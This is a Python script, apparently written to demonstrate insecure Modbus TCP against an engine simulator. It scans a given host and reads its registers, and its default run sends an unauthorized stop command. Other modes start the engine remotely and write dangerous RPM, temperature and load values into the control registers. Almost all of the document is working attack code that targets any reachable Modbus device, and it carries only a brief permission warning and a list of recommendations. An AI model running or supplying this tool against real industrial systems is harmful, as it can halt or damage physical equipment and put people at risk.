#!/usr/bin/env python3
"""
Enhanced MODBUS TCP Vulnerability Demonstration Script
This script demonstrates security vulnerabilities in remote MODBUS TCP servers
Can be used to test the standalone backend running on different machines
"""

from pyModbusTCP.client import ModbusClient
import time
import yaml
import argparse
import socket
import sys
from pathlib import Path
from datetime import datetime

class ModbusVulnerabilityDemo:
    def __init__(self, config_file=None):
        """Initialize the vulnerability demonstration tool"""
        
        # Load configuration
        if config_file is None:
            config_file = Path(__file__).parent / 'config.yaml'
        
        try:
            with open(config_file, 'r') as f:
                self.config = yaml.safe_load(f)
        except FileNotFoundError:
            print(f"Warning: Config file {config_file} not found, using defaults")
            self.config = self._default_config()
        
        self.registers = self.config['registers']
        
    def _default_config(self):
        """Default configuration if config file not found"""
        return {
            'registers': {
                'status': 0, 'rpm': 1, 'temp': 2, 'fuel_flow': 3, 'load': 4
            }
        }
    
    def scan_modbus_server(self, host, port=502, timeout=3):
        """Scan if a MODBUS TCP server is running on the target"""
        print(f"Scanning {host}:{port} for MODBUS TCP service...")
        
        try:
            # Try to establish a socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                print(f"✓ Port {port} is OPEN on {host}")
                
                # Try to connect with MODBUS client
                client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
                if client.open():
                    print(f"✓ MODBUS TCP service confirmed on {host}:{port}")
                    client.close()
                    return True
                else:
                    print(f"✗ Port open but MODBUS service not responding on {host}:{port}")
                    return False
            else:
                print(f"✗ Port {port} is CLOSED on {host}")
                return False
                
        except Exception as e:
            print(f"✗ Error scanning {host}:{port}: {e}")
            return False
    
    def read_all_registers(self, host, port=502):
        """Read all engine registers from the target"""
        print(f"\n{'='*60}")
        print(f"READING ENGINE DATA FROM {host}:{port}")
        print(f"{'='*60}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to {host}:{port}")
                return None
            
            engine_data = {}
            
            for reg_name, reg_addr in self.registers.items():
                try:
                    value = client.read_holding_registers(reg_addr, 1)
                    if value:
                        raw_value = value[0]
                        
                        # Convert special values
                        if reg_name == 'fuel_flow':
                            display_value = raw_value / 100.0  # Convert back from integer storage
                        else:
                            display_value = raw_value
                        
                        engine_data[reg_name] = {
                            'raw': raw_value,
                            'display': display_value,
                            'register': reg_addr
                        }
                        
                        print(f"  {reg_name.upper()}: {display_value} (Register {reg_addr})")
                    else:
                        print(f"  {reg_name.upper()}: Failed to read (Register {reg_addr})")
                        
                except Exception as e:
                    print(f"  {reg_name.upper()}: Error reading - {e}")
            
            return engine_data
            
        except Exception as e:
            print(f"✗ Error reading registers: {e}")
            return None
        finally:
            client.close()
    
    def demonstrate_stop_attack(self, host, port=502):
        """Demonstrate unauthorized engine stop attack"""
        print(f"\n{'!'*80}")
        print(f"{'!'*80}")
        print(f"INITIATING SECURITY EXPLOIT")
        print(f"TARGET: {host}:{port}")
        print(f"ATTACK: UNAUTHORIZED ENGINE SHUTDOWN")
        print(f"{'!'*80}")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {host}:{port}")
                return False
            
            # Read current status
            current_status = client.read_holding_registers(self.registers['status'], 1)
            if current_status:
                print(f"Current engine status: {current_status[0]}")
                
                if current_status[0] == 1:
                    print("Engine is currently RUNNING - proceeding with attack...")
                elif current_status[0] == 0:
                    print("Engine is already STOPPED - attack not needed")
                    return True
                else:
                    print(f"Engine in unknown state ({current_status[0]}) - proceeding anyway...")
            
            # Execute the attack - send stop command
            print("\nExecuting STOP command via MODBUS TCP...")
            print("Writing 0 to status register...")
            
            success = client.write_single_register(self.registers['status'], 0)
            
            if success:
                print(f"\n{'!'*80}")
                print(f"{'!'*80}")
                print(f"EXPLOIT SUCCESSFUL!")
                print(f"UNAUTHORIZED STOP COMMAND SENT!")
                print(f"{'!'*80}")
                print(f"{'!'*80}")
                
                # Verify the attack worked
                time.sleep(1)
                new_status = client.read_holding_registers(self.registers['status'], 1)
                if new_status:
                    print(f"\nVerification - New engine status: {new_status[0]}")
                    if new_status[0] == 0:
                        print("✓ Engine successfully stopped by unauthorized command")
                    else:
                        print("? Engine status unexpected after attack")
                
                print(f"\n{'-'*60}")
                print("SECURITY IMPLICATIONS:")
                print("✗ No authentication required for critical commands")
                print("✗ No encryption of sensitive control data")
                print("✗ No access control or authorization checks")
                print("✗ Engine can be stopped by anyone on the network")
                print("✗ Real-world consequences could be catastrophic")
                print(f"{'-'*60}")
                
                return True
            else:
                print("✗ Failed to send stop command")
                return False
                
        except Exception as e:
            print(f"✗ Error during attack: {e}")
            return False
        finally:
            client.close()
    
    def demonstrate_start_attack(self, host, port=502):
        """Demonstrate unauthorized engine start attack"""
        print(f"\n{'!'*80}")
        print(f"INITIATING UNAUTHORIZED START ATTACK")
        print(f"TARGET: {host}:{port}")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {host}:{port}")
                return False
            
            # Check current status
            current_status = client.read_holding_registers(self.registers['status'], 1)
            if current_status and current_status[0] != 0:
                print("Engine is not stopped - start attack not applicable")
                return True
            
            # Execute start attack
            print("Sending unauthorized START command...")
            success = client.write_single_register(self.registers['status'], 1)
            
            if success:
                print("✓ Unauthorized START command sent successfully!")
                time.sleep(2)
                
                # Check if it worked
                new_status = client.read_holding_registers(self.registers['status'], 1)
                if new_status and new_status[0] == 1:
                    print("✓ Engine started by unauthorized command")
                else:
                    print("? Engine did not start as expected")
                
                return True
            else:
                print("✗ Failed to send start command")
                return False
                
        except Exception as e:
            print(f"✗ Error during start attack: {e}")
            return False
        finally:
            client.close()
    
    def demonstrate_parameter_manipulation(self, host, port=502):
        """Demonstrate manipulation of engine parameters"""
        print(f"\n{'!'*60}")
        print(f"DEMONSTRATING PARAMETER MANIPULATION ATTACK")
        print(f"{'!'*60}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {host}:{port}")
                return False
            
            # Try to manipulate various parameters
            manipulations = [
                ('rpm', 9999, "Setting RPM to dangerous level"),
                ('temp', 999, "Setting temperature to critical level"),
                ('load', 150, "Setting load beyond safe limits")
            ]
            
            for param, malicious_value, description in manipulations:
                if param in self.registers:
                    print(f"\n{description}...")
                    reg_addr = self.registers[param]
                    
                    # Read current value
                    current = client.read_holding_registers(reg_addr, 1)
                    if current:
                        print(f"  Current {param}: {current[0]}")
                    
                    # Try to write malicious value
                    success = client.write_single_register(reg_addr, malicious_value)
                    if success:
                        print(f"  ✓ Successfully wrote {malicious_value} to {param} register")
                        
                        # Verify
                        time.sleep(0.5)
                        new_value = client.read_holding_registers(reg_addr, 1)
                        if new_value:
                            print(f"  Verification: {param} now reads {new_value[0]}")
                    else:
                        print(f"  ✗ Failed to write to {param} register")
            
            return True
            
        except Exception as e:
            print(f"✗ Error during parameter manipulation: {e}")
            return False
        finally:
            client.close()
    
    def full_vulnerability_assessment(self, host, port=502):
        """Perform complete vulnerability assessment"""
        print(f"\n{'#'*80}")
        print(f"COMPLETE VULNERABILITY ASSESSMENT")
        print(f"Target: {host}:{port}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'#'*80}")
        
        # Step 1: Scan for service
        if not self.scan_modbus_server(host, port):
            print("Target not reachable or MODBUS service not available")
            return False
        
        # Step 2: Read current state
        engine_data = self.read_all_registers(host, port)
        if not engine_data:
            print("Failed to read engine data")
            return False
        
        # Step 3: Demonstrate stop attack
        self.demonstrate_stop_attack(host, port)
        
        # Wait a moment
        time.sleep(2)
        
        # Step 4: Read state after attack
        print(f"\nReading engine state after attack...")
        self.read_all_registers(host, port)
        
        # Step 5: Demonstrate start attack
        self.demonstrate_start_attack(host, port)
        
        # Step 6: Parameter manipulation
        self.demonstrate_parameter_manipulation(host, port)
        
        print(f"\n{'#'*80}")
        print(f"VULNERABILITY ASSESSMENT COMPLETE")
        print(f"{'#'*80}")
        print("CRITICAL FINDINGS:")
        print("1. No authentication required for MODBUS access")
        print("2. No encryption of control communications")
        print("3. Engine can be started/stopped remotely without authorization")
        print("4. Safety-critical parameters can be manipulated")
        print("5. No intrusion detection or logging visible")
        print("\nRECOMMENDATIONS:")
        print("1. Implement MODBUS security protocols")
        print("2. Use VPN or encrypted tunnels for remote access")
        print("3. Add authentication and authorization layers")
        print("4. Implement network segmentation")
        print("5. Add intrusion detection systems")
        print("6. Regular security auditing and monitoring")
        print(f"{'#'*80}")
        
        return True


def main():
    """Main entry point for vulnerability demonstration"""
    parser = argparse.ArgumentParser(description='MODBUS TCP Vulnerability Demonstration')
    parser.add_argument('host', help='Target MODBUS server IP address')
    parser.add_argument('--port', type=int, default=502, help='MODBUS TCP port (default: 502)')
    parser.add_argument('--config', help='Path to configuration file')
    parser.add_argument('--scan-only', action='store_true', help='Only scan for MODBUS service')
    parser.add_argument('--read-only', action='store_true', help='Only read registers, no attacks')
    parser.add_argument('--stop-only', action='store_true', help='Only demonstrate stop attack')
    parser.add_argument('--full', action='store_true', help='Full vulnerability assessment')
    
    args = parser.parse_args()
    
    # Create vulnerability demo instance
    demo = ModbusVulnerabilityDemo(config_file=args.config)
    
    print("MODBUS TCP Vulnerability Demonstration Tool")
    print("=" * 50)
    print(f"Target: {args.host}:{args.port}")
    print("WARNING: This tool demonstrates real security vulnerabilities")
    print("Only use on systems you own or have permission to test")
    print("=" * 50)
    
    # Execute based on arguments
    if args.scan_only:
        demo.scan_modbus_server(args.host, args.port)
    elif args.read_only:
        demo.read_all_registers(args.host, args.port)
    elif args.stop_only:
        demo.demonstrate_stop_attack(args.host, args.port)
    elif args.full:
        demo.full_vulnerability_assessment(args.host, args.port)
    else:
        # Default behavior - just stop attack
        if demo.scan_modbus_server(args.host, args.port):
            demo.read_all_registers(args.host, args.port)
            demo.demonstrate_stop_attack(args.host, args.port)


if __name__ == "__main__":
    main() 